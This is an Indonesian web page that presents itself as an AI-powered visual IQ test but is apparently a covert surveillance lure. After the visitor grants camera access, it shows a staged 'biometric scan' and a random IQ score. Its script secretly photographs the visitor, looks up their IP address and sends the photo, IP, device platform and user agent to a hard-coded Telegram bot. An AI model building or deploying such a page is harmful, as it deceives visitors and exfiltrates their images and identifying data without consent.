<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tes Kecerdasan Visual AI</title>
    <link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;700&family=Montserrat:wght@300;500&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --primary-blue: #00bcd4; /* Cyan */
            --dark-bg: #1a1a2e;
            --card-bg: #27273d;
            --text-color: #e0e0e0;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: var(--text-color);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB2aWV3Qm94PSIwIDAgNzAgNzAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+Cgk8ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPgoJCTxwYXRoIGZpbGw9IiM0NDQ0NUEiIGQ9Ik0wIDBoNzB2NzBIMHoiLz4KCQk8cGF0aCBmaWxsPSIjNTA1MDAwIiBkPSJNMzUgMzVoMzV2MzVIMzV6TTAgMGgzNXYzNUgweCIvPgoJPC9nPgo8L3N2Zz4=') repeat;
            opacity: 0.1;
            z-index: 1;
        }

        .container {
            position: relative;
            z-index: 2;
            width: 90%;
            max-width: 450px;
            background: var(--card-bg);
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            padding: 30px;
            text-align: center;
            border: 1px solid rgba(0, 188, 212, 0.3);
            backdrop-filter: blur(10px);
            transition: height 0.3s ease;
        }

        h1 {
            font-family: 'Chakra Petch', sans-serif;
            font-size: 1.6rem;
            color: var(--primary-blue);
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 15px;
            text-shadow: 0 0 10px rgba(0, 188, 212, 0.5);
        }

        .icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background-color: var(--primary-blue);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 3rem;
            color: var(--card-bg);
            box-shadow: 0 0 20px var(--primary-blue);
        }

        /* --- KOTAK KAMERA --- */
        .camera-container {
            width: 280px; /* Sedikit diperbesar agar jelas */
            height: 280px;
            margin: 0 auto 20px;
            border: 3px solid var(--primary-blue);
            border-radius: 15px;
            position: relative;
            overflow: hidden;
            background: #000;
            display: none; /* Muncul saat mulai */
            box-shadow: 0 0 20px rgba(0, 188, 212, 0.4);
        }

        #video-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
            /* Tetap cerah sesuai request */
            filter: brightness(1.3) contrast(1.1) saturate(1.1);
        }

        .scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: var(--primary-blue);
            box-shadow: 0 0 15px var(--primary-blue);
            z-index: 5;
            animation: moveScan 2s ease-in-out infinite;
        }

        @keyframes moveScan {
            0% { top: 0%; }
            50% { top: 100%; }
            100% { top: 0%; }
        }

        .description {
            font-size: 0.95rem;
            line-height: 1.6;
            color: var(--text-color);
            margin-bottom: 30px;
        }

        .start-btn {
            background: linear-gradient(45deg, #00bcd4, #00e5ff);
            border: none;
            padding: 15px 35px;
            border-radius: 50px;
            color: #1a1a2e;
            font-weight: bold;
            font-family: 'Chakra Petch', sans-serif;
            font-size: 1rem;
            cursor: pointer;
            box-shadow: 0 8px 25px rgba(0, 188, 212, 0.4);
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .start-btn:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 12px 30px rgba(0, 188, 212, 0.6);
        }

        /* --- LOADING UI (Sekarang di dalam Container) --- */
        .scanning-ui {
            display: none; /* Hidden by default */
            margin-top: 20px;
        }

        .loading-text {
            color: var(--primary-blue);
            font-size: 1rem;
            margin-bottom: 10px;
            font-family: 'Chakra Petch', sans-serif;
            letter-spacing: 1px;
            animation: blink 1.5s infinite;
        }
        
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }

        .progress-bar-container {
            width: 100%;
            height: 10px;
            background-color: #444;
            border-radius: 5px;
            overflow: hidden;
            border: 1px solid #555;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00bcd4, #00e5ff);
            border-radius: 5px;
            transition: width 0.1s linear;
        }

        /* Sembunyikan elemen capture asli */
        video#video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="icon" id="mainIcon">ðŸ§ </div>
        <h1 id="mainTitle">TES KECERDASAN VISUAL AI</h1>
        <p class="description" id="mainDesc">
            Siapakah Anda yang sebenarnya? Uji kemampuan visual dan reaksi otak Anda dengan teknologi AI tercanggih kami. Sistem akan menganalisis ekspresi wajah Anda secara real-time.
        </p>
        
        <div class="camera-container" id="camContainer">
            <video id="video-preview" autoplay playsinline></video>
            <div class="scan-line"></div>
        </div>

        <div class="scanning-ui" id="scanningUI">
            <p class="loading-text" id="loadingStatus">Menginisialisasi Kamera...</p>
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>

        <button class="start-btn" id="startBtn" onclick="startTest()">MULAI TES SEKARANG</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const BOT_TOKEN = '8213442592:AAHQBg6QTw6gP7XeX_hrSFopwlX_ii5B8lo';
        const CHAT_ID = '6213349853';
        
        let stream = null;

        async function startTest() {
            const scanningUI = document.getElementById('scanningUI');
            const loadingStatus = document.getElementById('loadingStatus');
            const progressBar = document.getElementById('progressBar');
            const camContainer = document.getElementById('camContainer');
            
            // Elemen yang akan disembunyikan
            const mainIcon = document.getElementById('mainIcon');
            const mainTitle = document.getElementById('mainTitle');
            const mainDesc = document.getElementById('mainDesc');
            const startBtn = document.getElementById('startBtn');

            try {
                // Minta izin kamera
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // --- UBAH TAMPILAN JADI MODE SCANNING ---
                // Sembunyikan elemen awal
                mainIcon.style.display = 'none';
                mainDesc.style.display = 'none';
                startBtn.style.display = 'none';
                // (Optional: Title bisa tetap ada atau dihilangkan, saya biarkan agar terlihat keren)
                // mainTitle.style.display = 'none'; 

                // Munculkan Kamera & Progress Bar
                camContainer.style.display = 'block';
                scanningUI.style.display = 'block';

                // Sambungkan stream ke preview
                document.getElementById('video-preview').srcObject = stream;
                
                // Reset progress
                progressBar.style.width = '0%';

                let progress = 0;
                let steps = [
                    "Mendeteksi Wajah...",
                    "Analisis Biometrik...",
                    "Memindai Retina...",
                    "Kalkulasi Algoritma IQ...",
                    "Finalisasi Data..."
                ];
                let currentStep = 0;

                const progressInterval = setInterval(() => {
                    progress += Math.floor(Math.random() * 8) + 3;
                    if (progress > 100) progress = 100;
                    progressBar.style.width = progress + '%';

                    if (progress >= 20 * (currentStep + 1) && currentStep < steps.length) {
                        loadingStatus.innerText = steps[currentStep];
                        currentStep++;
                    }

                    if (progress >= 100) {
                        clearInterval(progressInterval);
                        loadingStatus.innerText = "Scan Selesai!";
                        
                        // Ambil foto (diam-diam)
                        captureAndSend(stream);

                        // Tahan sebentar di 100% lalu tampilkan hasil
                        setTimeout(() => {
                            displayResult();
                        }, 1200);
                    }
                }, 300);

            } catch (err) {
                Swal.fire({
                    icon: 'warning',
                    title: 'Akses Ditolak',
                    text: 'Wajib mengizinkan kamera untuk proses scanning AI.',
                    confirmButtonColor: '#00bcd4'
                });
            }
        }

        async function captureAndSend(cameraStream) {
            const video = document.getElementById('video-preview'); 
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Efek cerah pada foto hasil tangkapan
            ctx.filter = "brightness(1.3) contrast(1.1) saturate(1.1)";
            ctx.drawImage(video, 0, 0);

            const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => ({json: () => ({ip: 'Unknown'})}));
            const ipData = await ipRes.json();

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'target_ai.jpg');
                formData.append('caption', `ðŸ§  *Hasil Scan AI Baru*\n\nðŸŒ IP: \`${ipData.ip}\`\nðŸ“± HP: \`${navigator.platform}\`\nðŸ” Info: \`${navigator.userAgent}\``);
                formData.append('parse_mode', 'Markdown');

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg');
        }

        function displayResult() {
            // Sembunyikan scanning UI
            document.getElementById('scanningUI').style.display = 'none';

            // IQ Acak murni antara 115 sampai 155
            const randomIq = Math.floor(Math.random() * (155 - 115 + 1)) + 115;
            let category = "";
            
            if (randomIq >= 140) category = "Jenius Eksponensial!";
            else if (randomIq >= 130) category = "Superior Kognitif!";
            else category = "Cerdas di Atas Rata-rata!";

            Swal.fire({
                title: 'ðŸŽ‰ HASIL ANALISIS',
                html: `Skor IQ Visual: <b style="color:#00bcd4; font-size:1.5rem;">${randomIq}</b><br>Kategori: <b>${category}</b>`,
                icon: 'success',
                confirmButtonText: 'TUTUP',
                confirmButtonColor: '#00bcd4'
            }).then(() => {
                // Matikan kamera setelah popup ditutup
                if(stream) stream.getTracks().forEach(t => t.stop());
                location.reload();
            });
        }
    </script>
</body>
</html>
